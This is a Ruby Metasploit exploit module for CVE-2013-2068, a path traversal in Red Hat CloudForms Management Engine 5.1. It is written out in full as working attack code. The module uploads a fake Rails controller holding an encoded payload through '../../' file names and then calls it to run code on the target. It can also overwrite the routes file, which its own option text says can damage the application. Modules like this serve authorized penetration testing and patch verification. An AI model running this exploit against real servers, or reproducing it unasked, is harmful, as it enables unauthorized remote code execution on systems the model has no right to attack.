##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize
    super(
      'Name'           => 'Red Hat CloudForms Management Engine 5.1 agent/linuxpkgs Path Traversal',
      'Description'    => %q{
        This module exploits a path traversal vulnerability in the "linuxpkgs"
        action of "agent" controller of the Red Hat CloudForms Management Engine 5.1
        (ManageIQ Enterprise Virtualization Manager 5.0 and earlier).
        It uploads a fake controller to the controllers directory of the Rails
        application with the encoded payload as an action and sends a request to
        this action to execute the payload. Optionally, it can also upload a routing
        file containing a route to the action. (Which is not necessary, since the
        application already contains a general default route.)
      },
      'Author'         => 'Ramon de C Valle',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2013-2068'],
          ['CWE', '22'],
          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=960422']
        ],
      'Platform'       => 'ruby',
      'Arch'           => ARCH_RUBY,
      'Privileged'     => true,
      'Targets'        =>
        [
          ['Automatic', {}]
        ],
      'DisclosureDate' => 'Sep 4 2013',
      'DefaultOptions' =>
        {
          'PrependFork' => true,
          'SSL' => true
        },
      'DefaultTarget' => 0
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('CONTROLLER', [false, 'The name of the controller']),
        OptString.new('ACTION', [false, 'The name of the action']),
        OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
        OptEnum.new('HTTP_METHOD', [true, 'HTTP Method', 'POST', ['GET', 'POST'] ])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('ROUTES', [true, 'Upload a routing file. Warning: It is not necessary by default and can damage the target application', false]),
      ])
  end

  def check
    res = send_request_cgi(
      'uri'    => normalize_uri(target_uri.path, "ping.html")
    )

    if res and res.code == 200 and res.body.to_s =~ /EVM ping response/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    controller =
      if datastore['CONTROLLER'].blank?
        Rex::Text.rand_text_alpha_lower(rand(9) + 3)
      else
        datastore['CONTROLLER'].downcase
      end

    action =
      if datastore['ACTION'].blank?
        Rex::Text.rand_text_alpha_lower(rand(9) + 3)
      else
        datastore['ACTION'].downcase
      end

    data = "class #{controller.capitalize}Controller < ApplicationController; def #{action}; #{payload.encoded}; render :nothing => true; end; end\n"

    print_status("Sending fake-controller upload request to #{target_url('agent', 'linuxpkgs')}...")
    res = upload_file("../../app/controllers/#{controller}_controller.rb", data)
    fail_with(Failure::Unknown, 'No response from remote host') if res.nil?
    register_files_for_cleanup("app/controllers/#{controller}_controller.rb")
    # According to rcvalle, all the version have not been checked
    # so we're not sure if res.code will be always 500, in order
    # to not lose sessions, just print warning and proceeding
    unless res and res.code == 500
      print_warning("Unexpected reply but proceeding anyway...")
    end

    if datastore['ROUTES']
      data = "Vmdb::Application.routes.draw { root :to => 'dashboard#login'; match ':controller(/:action(/:id))(.:format)' }\n"

      print_status("Sending routing-file upload request to #{target_url('agent', 'linuxpkgs')}...")
      res = upload_file("../../config/routes.rb", data)
      fail_with(Failure::Unknown, 'No response from remote host') if res.nil?
      # According to rcvalle, all the version have not been checked
      # so we're not sure if res.code will be always 500, in order
      # to not lose sessions, just print warning and proceeding
      unless res and res.code == 500
        print_warning("Unexpected reply but proceeding anyway...")
      end
    end

    print_status("Sending execute request to #{target_url(controller, action)}...")
    send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, controller, action)
    )
  end

  def upload_file(filename, data)
    res = send_request_cgi(
      'method' => datastore['HTTP_METHOD'],
      'uri'    => normalize_uri(target_uri.path, 'agent', 'linuxpkgs'),
      "vars_#{datastore['HTTP_METHOD'].downcase}" => {
        'data'     => Rex::Text.encode_base64(Rex::Text.zlib_deflate(data)),
        'filename' => filename,
        'md5'      => Rex::Text.md5(data)
      }
    )

    return res
  end

  def target_url(*args)
    (ssl ? 'https' : 'http') +
      if rport.to_i == 80 || rport.to_i == 443
        "://#{vhost}"
      else
        "://#{vhost}:#{rport}"
      end + normalize_uri(target_uri.path, *args)
  end
end

